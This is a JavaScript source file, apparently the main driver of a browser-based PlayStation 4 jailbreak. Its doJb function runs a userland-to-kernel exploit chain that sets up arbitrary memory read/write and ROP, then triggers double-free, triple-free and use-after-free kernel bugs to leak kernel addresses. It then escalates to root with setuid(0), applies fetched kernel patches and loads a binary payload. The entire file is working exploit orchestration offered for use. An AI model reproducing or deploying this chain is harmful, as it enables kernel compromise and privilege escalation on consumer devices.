// Global error handler
window.onerror = function(msg, url, line, col, error) {
    console.error('[main.js] Global error:', msg, error);
    const consoleEl = document.getElementById('console');
    if (consoleEl) {
        consoleEl.append('\n[ERROR] ' + msg + '\n');
    }
};

function load_script(src) {
  return new Promise((resolve, reject) => {
    const script = document.createElement("script");
    script.src = src;
    script.onload = resolve;
    script.onerror = function() { reject(new Error('Failed to load ' + src)); };
    document.head.appendChild(script);
  });
}

function setVersionFromString(versionStr) {
    const parts = versionStr.split('.');
    if (parts.length !== 2) throw new Error('Invalid version format');
    version.major = parseInt(parts[0], 10);
    version.minor = parseInt(parts[1], 16);
    version.console = 4; // PS4
}

async function doJb(versionStr) {
    console.log('[main.js] doJb called with version:', versionStr);

    try {
        // Set version
        if (versionStr) {
            setVersionFromString(versionStr);
        } else {
            version.init();
        }

        // Load required scripts
        await load_script("src/misc.js");

        switch (version.console) {
            case 4:
                await load_script("src/ps4/constants.js");
                await load_script("src/ps4/userland.js");
                break;
            case 5:
                break;
            default:
                logger.info(`Unsupported console ${version.console}`);
        }

        logger.info("===USERLAND===");

        let rw = undefined;
        if (arw.master === undefined) {
            rw = await init_rw();
        }

        init_arw(rw);
        init_rop();
        init_syscalls();

        logger.info("===END===");

        await load_script("src/loader.js");
        await load_script("src/workers.js");

        switch (version.console) {
            case 4:
                await load_script("src/ps4/kernel.js");
                break;
            case 5:
                break;
            default:
                logger.info(`Unsupported console ${version.console}`);
        }

        // exploitChain is defined from script.js
        console.log('[main.js] Loading exploit chain:', exploitChain);
        await load_script(`src/${exploitChain}.js`);

        logger.info(`===${exploitChain.toUpperCase()}===`);

        try {
            if (exploitChain == "lapse") {
                init();
                await setup();
                await double_free_reqs2();
                leak_kaddrs();
                double_free_reqs1();
                make_karw();
                inc_karw_pipe_refcnt();
                logger.info("Corrupted context cleanup started...");
                remove_pktinfo_from_so(pktopts_twins[0]);
                remove_rthdr_from_so(pktopts_twins[1]);
                remove_rthdr_from_so(rthdr_twins[0]);
                logger.info("Corrupted context cleanup completed !!");
            } else {
                init();
                await setup();
                await ucred_triple_free();
                leak_kqueue();
                await make_karw();
                inc_karw_pipe_refcnt();
                logger.info("Corrupted context cleanup started...");
                for (let i = 0; i < triplets.length; i++) {
                    remove_rthdr_from_so(triplets[i]);
                }
                remove_uaf_file();
                logger.info("Corrupted context cleanup completed !!");
            }
        } finally {
            cleanup();
        }

        find_all_proc();

        if (fn.setuid.invoke(0) === -1) {
            jailbreak();

            const kpatches_rsp = await fetch(`src/ps4/patches/${constants.KPATCH}`);
            const kpatches_buf = await kpatches_rsp.arrayBuffer();
            const kpatches_u8 = new Uint8Array(kpatches_buf);
            kernel_patches(kpatches_u8);

            // --- Load payload based on selected version ---
            const major = version.major;
            const minor = version.minor.toString(16).padStart(2, '0');
            const payloadFile = `payload_${major}${minor}.bin`;
            let bin_rsp;
            try {
                bin_rsp = await fetch(`src/${payloadFile}`);
                if (!bin_rsp.ok) throw new Error('Payload not found');
            } catch {
                logger.info(`Payload ${payloadFile} not found, falling back to src/payload.bin`);
                bin_rsp = await fetch("src/payload.bin");
            }
            const bin_buf = await bin_rsp.arrayBuffer();
            const bin_u8 = new Uint8Array(bin_buf);
            load_bin(bin_u8);
        }

        logger.info("===END===");
    } catch (e) {
        logger.error(e.message);
        logger.error(e.stack);
        // Re-throw so the button can handle the error
        throw e;
    }
}
